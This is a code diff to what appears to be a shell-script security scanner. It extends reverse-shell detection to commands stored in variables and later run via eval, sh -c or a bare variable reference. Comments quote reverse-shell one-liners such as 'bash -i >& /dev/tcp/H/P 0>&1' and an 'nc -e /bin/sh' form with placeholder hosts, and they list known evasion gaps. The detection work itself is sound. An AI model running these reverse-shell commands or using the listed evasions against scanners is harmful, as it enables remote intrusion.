@@ -18120,12 +18120,140 @@ _SH_REV_REASONS = {
 }
 
 
+# B-1062: a reverse-shell command STORED in a shell variable and then run through it.
+#   C="bash -i >& /dev/tcp/H/P 0>&1"; eval "$C"        sh -c "$C"        $C   (nc -e form)
+# The scan above only reads a payload in command position, so the stored text -- plainly on
+# the assignment line -- was never judged. The closed mechanism added here: remember, in
+# source order, each variable whose value is ONE plain quoted literal (no `$`, no backtick,
+# no command substitution), and where a later line RUNS the variable -- `eval "$C"` / `eval $C`,
+# `<shell> [flags] -c "$C"` (QUOTED ref only: unquoted `-c $C` word-splits and runs only the first
+# word), or an unquoted `$C` / `${C}` as the first word of a statement -- rewrite the reference
+# into the literal it stands for and let the existing command-position rules judge the result.
+# So the inline form and the stored form get the same verdict by construction. A mere
+# `echo "$C"` / `printf %s "$C"` / `cat <<<"$C"` is not a run site and stays silent. Any
+# other rebinding of the name (a non-literal assignment, `+=`, `unset`, `read`, a `for` loop
+# variable, `local`/`declare` without a literal) forgets it. Known limits (kept, like the rest
+# of this block, closed): a value built from other variables or `$(...)`, a value spanning
+# several lines, a copy through a second variable (`D=$C; eval "$D"`), `echo "$C" | bash`
+# (the pipe-to-shell shape is already a declared ceiling), `source <(echo "$C")`, and
+# scope: the walk is source-ordered and flow-insensitive across functions and branches.
+_SH_STORED_ASSIGN_RE = re.compile(
+    r"(?:^|[;&|({]|\bthen\b|\bdo\b|\belse\b)\s*"
+    r"(?:(?:export|readonly|declare(?:\s+-[A-Za-z]+)*|typeset(?:\s+-[A-Za-z]+)*|local)\s+)?"
+    r"(?P<name>[A-Za-z_]\w*)=(?P<val>\"(?:[^\"\\]|\\.)*\"|'[^']*')?"
+)
+_SH_STORED_REBIND_RE = re.compile(
+    r"(?:^|[;&|({]|\bthen\b|\bdo\b|\belse\b)\s*(?:"
+    r"(?P<plus>[A-Za-z_]\w*)\+=|unset\s+(?:-[fnv]\s+)?(?P<unset>[A-Za-z_]\w*)"
+    r"|for\s+(?P<for>[A-Za-z_]\w*)\s+in\b|read\s+(?:-[A-Za-z]+\s+)*(?P<read>[A-Za-z_]\w*))"
+)
+_SH_STORED_NAME = r"[A-Za-z_]\w*"
+_SH_STORED_EVAL_USE_RE = re.compile(
+    r"(?<![\w.$/{}-])eval\s+(?P<ref>\"\$(?P<n1>" + _SH_STORED_NAME + r")\"|\"\$\{(?P<n2>" + _SH_STORED_NAME
+    + r")\}\"|\$(?P<n3>" + _SH_STORED_NAME + r")\b|\$\{(?P<n4>" + _SH_STORED_NAME + r")\})"
+)
+_SH_STORED_DASHC_USE_RE = re.compile(
+    r"(?<=\s)-[A-Za-z]*c\s+(?P<ref>\"\$(?P<n1>" + _SH_STORED_NAME + r")\"|\"\$\{(?P<n2>" + _SH_STORED_NAME + r")\}\")"
+)
+_SH_STORED_BARE_USE_RE = re.compile(
+    r"(?:^|[;&|({]|\bthen\b|\bdo\b|\belse\b)\s*(?P<ref>\$(?P<n3>" + _SH_STORED_NAME + r")\b|\$\{(?P<n4>"
+    + _SH_STORED_NAME + r")\})"
+)
+_SH_STORED_META_RE = re.compile(r"[;&|<>()$`'\"\\\n{}*?\[~#]")
+_SH_STORED_ADD_MAX = 16384  # bytes inlining may add to ONE line
+_SH_STORED_FILE_MAX = 1 << 20  # ... and to one whole file
+
+
+def _sh_stored_literal(val: str) -> "str | None":
+    """The text a plain quoted literal stands for, or None when it expands anything."""
+    q = val[0]
+    body = val[1:-1]
+    if q == "'":
+        return body
+    if re.search(r"(?<!\\)(?:\$|`)", body):
+        return None
+    return re.sub(r"\\([\"$`\\])", r"\1", body)
+
+
+def _sh_stored_track(line: str, env: dict) -> None:
+    """Update `env` (name -> literal) from the assignments / rebindings on one logical line.
+
+    Only a literal that can carry a reverse-shell primitive at all (a cue, or an `&` that may
+    dup an fd) is kept -- any other value can never convict, so it needs no entry -- and there
+    is NO count or length cap: every kept value is a slice of the file being scanned, so memory
+    is bounded by the file, and a cap would be an evasion (64 dummy assignments, or a payload
+    padded with spaces, in front of the real one). Runs of blanks are collapsed so padding does
+    not push the payload past the scan's own argument bound. What bounds the WORK is the
+    per-line inlining budget in `_sh_stored_inline`, which spills to a memoized scan instead."""
+    for m in _SH_STORED_REBIND_RE.finditer(line):
+        env.pop(m.group("plus") or m.group("unset") or m.group("for") or m.group("read"), None)
+    for m in _SH_STORED_ASSIGN_RE.finditer(line):
+        name, val = m.group("name"), m.group("val")
+        lit = _sh_stored_literal(val) if val else None
+        # a quoted literal must END the word (`C="a"$X` is not a plain literal)
+        if lit is not None and line[m.end() : m.end() + 1] not in ("", " ", "\t", ";", "&", "|", ")", "}", "#"):
+            lit = None
+        if lit is not None:
+            lit = re.sub(r"[ \t]{2,}", " ", lit).strip()
+        if lit and (_SH_REV_CUE_RE.search(lit) or "&" in lit):
+            env[name] = lit
+        else:
+            env.pop(name, None)
+
+
+def _sh_stored_inline(line: str, env: dict, budget: list) -> tuple:
+    """`(text, spill)`: `line` with every RUN reference to a tracked variable replaced by the
+    literal it holds (double-quoted for the `eval` / `-c` wrapper forms, raw for a bare
+    command-position `$C`), and `spill` = `{literal: kind}` for the references that were NOT
+    inlined because the line's added-bytes budget (`_SH_STORED_ADD_MAX`) or the file's
+    (`budget[0]`, shared across lines) ran out. A spilled
+    literal is judged on its own by the caller (memoized), so the budget bounds the work
+    without ever silently dropping a reference."""
+    if not env or "$" not in line:
+        return line, {}
+    spill: dict = {}
+    added = [0]
+
+    def sub(rx, quote: bool, text: str) -> str:
+        out = []
+        last = 0
+        for m in rx.finditer(text):
+            name = next((m.group(g) for g in ("n1", "n2", "n3", "n4") if m.groupdict().get(g)), None)
+            lit = env.get(name) if name else None
+            if lit is None:
+                continue
+            # A bare `$C` is only word-split, never re-parsed as shell syntax: it can run a
+            # stored `nc -e /bin/sh H P` but NOT a stored redirect (`bash -i >& /dev/tcp/..`
+            # would hand `>&` to bash as an argument). Only a metacharacter-free value counts.
+            if not quote and _SH_STORED_META_RE.search(lit):
+                continue
+            if added[0] + len(lit) > _SH_STORED_ADD_MAX or len(lit) > budget[0]:
+                spill[lit] = "q" if quote else "b"
+                continue
+            added[0] += len(lit)
+            budget[0] -= len(lit)
+            if quote:
+                lit = '"' + lit.replace("\\", "\\\\").replace('"', '\\"').replace("$", "\\$").replace("`", "\\`") + '"'
+            out.append(text[last : m.start("ref")])
+            out.append(lit)
+            last = m.end("ref")
+        out.append(text[last:])
+        return "".join(out)
+
+    line = sub(_SH_STORED_EVAL_USE_RE, True, line)
+    line = sub(_SH_STORED_DASHC_USE_RE, True, line)
+    return sub(_SH_STORED_BARE_USE_RE, False, line), spill
+
+
 def _sh_reverse_shell_lines(masked: str) -> list:
     """`[(physical_line, shape)]` for every logical line of `masked` (whole-line comments
     already blanked) carrying a reverse-shell primitive -- see the C-630 block above."""
     joined = _sh_loop_join_continuations(masked)
     hits = []
     open_fds: set = set()
+    var_env: dict = {}  # B-1062: variables holding one plain quoted literal
+    inline_budget = [_SH_STORED_FILE_MAX]
+    spill_memo: dict = {}  # (literal, open fds) -> shape | None
     ln = 1
     pos = 0
     for raw in joined.split("\n"):
@@ -18133,7 +18261,8 @@ def _sh_reverse_shell_lines(masked: str) -> list:
         seg = pos
         ln += masked.count("\n", pos, pos + len(raw)) + 1
         pos += len(raw) + 1
-        if not _SH_REV_CUE_RE.search(raw) and not (open_fds and "&" in raw):
+        track = bool(var_env) or "=" in raw  # B-1062: assignments / rebinds / run sites
+        if not track and not _SH_REV_CUE_RE.search(raw) and not (open_fds and "&" in raw):
             continue
         # Comments are code that never runs: blank them (per PHYSICAL line -- see
         # `_sh_rev_lex`) before anything reads the line, so a trailing `# note` cannot turn
@@ -18146,6 +18275,15 @@ def _sh_reverse_shell_lines(masked: str) -> list:
                 breaks.append(k - seg)
                 k = masked.find("\n", k + 1, seg + len(raw))
             raw = _sh_rev_lex(raw, breaks)[1]
+        # B-1062: the stored-variable view of the line is an ADDITIONAL layer next to the
+        # original text (never a replacement), so inlining can only add a detection.
+        inl, spill = raw, {}
+        if track:
+            _sh_stored_track(raw, var_env)
+            inl, spill = _sh_stored_inline(raw, var_env, inline_budget)
+        if not _SH_REV_CUE_RE.search(raw) and not (open_fds and "&" in raw):
+            if not spill and (inl == raw or not (_SH_REV_CUE_RE.search(inl) or (open_fds and "&" in inl))):
+                continue
         # Every layer is (text, quote mask, command-position oracle), each built once. A wrapper
         # BODY is only worth a scan when it can carry a primitive at all -- the same gate the
         # line itself passed (a cue, or an `&` that could be a dup of an fd this line opens):
@@ -18153,23 +18291,58 @@ def _sh_reverse_shell_lines(masked: str) -> list:
         # is exact, not a heuristic: nothing in `_sh_rev_scan_text` can answer for a text
         # without a cue unless it dups an fd (`&`), and an unwrapped body only ever loses
         # backslashes, so it cannot GAIN a cue its parent lacked.
-        may_open = bool(open_fds) or "/dev/" in raw
-        layers = [(raw, *_sh_rev_prepare(raw))]
-        texts = list(layers)
-        for _ in range(2):  # `bash -c "bash -c '...'"`: two wrapper levels, no more
-            nxt = []
-            for t, mask, oracle in layers:
-                for body in _sh_rev_unwrap(t, mask, oracle):
-                    if _SH_REV_CUE_RE.search(body) or (may_open and "&" in body):
-                        b = _sh_rev_lex(body, [])[1]
-                        nxt.append((b, *_sh_rev_prepare(b)))
-            if not nxt:
-                break
-            layers = nxt
-            texts.extend(layers)
+        may_open = bool(open_fds) or "/dev/" in raw or "/dev/" in inl
+        raw_ok = bool(_SH_REV_CUE_RE.search(raw)) or bool(open_fds and "&" in raw)
+
+        def widen(seed):
+            out = list(seed)
+            cur = seed
+            for _ in range(2):  # `bash -c "bash -c '...'"`: two wrapper levels, no more
+                nxt = []
+                for t, mask, oracle in cur:
+                    for body in _sh_rev_unwrap(t, mask, oracle):
+                        if _SH_REV_CUE_RE.search(body) or (may_open and "&" in body):
+                            b = _sh_rev_lex(body, [])[1]
+                            nxt.append((b, *_sh_rev_prepare(b)))
+                if not nxt:
+                    break
+                cur = nxt
+                out.extend(cur)
+            return out
+
+        fds_before = set(open_fds)
         shape = None
-        for t, mask, oracle in texts:
+        # (a raw line without its own cue cannot answer -- the gate above is exact -- so it is
+        # not scanned; only its inlined / spilled view below can)
+        for t, mask, oracle in widen([(raw, *_sh_rev_prepare(raw))]) if raw_ok else ():
             shape = _sh_rev_scan_text(t, open_fds, mask, oracle)
+            if shape:
+                break
+        if not shape and inl != raw:
+            # the inlined text, scanned from the fd state the line started in
+            fds = set(fds_before)
+            seed = [(inl, *_sh_rev_prepare(inl))]
+            for t, mask, oracle in widen(seed):
+                shape = _sh_rev_scan_text(t, fds, mask, oracle)
+                if shape:
+                    break
+            open_fds.clear()
+            open_fds.update(fds)
+        for lit in () if shape else spill:
+            # over-budget references: judge the literal itself, once per (literal, fd state);
+            # the fd state it leaves behind is part of the memo, so a hit and a miss agree
+            key = (lit, frozenset(open_fds))
+            if key not in spill_memo:
+                b = _sh_rev_lex(lit, [])[1]
+                got = None
+                fds = set(open_fds)
+                for t, mask, oracle in widen([(b, *_sh_rev_prepare(b))]):
+                    got = _sh_rev_scan_text(t, fds, mask, oracle)
+                    if got:
+                        break
+                spill_memo[key] = (got, frozenset(fds))
+            shape, fds_after = spill_memo[key]
+            open_fds.update(fds_after)
             if shape:
                 break
         if shape:
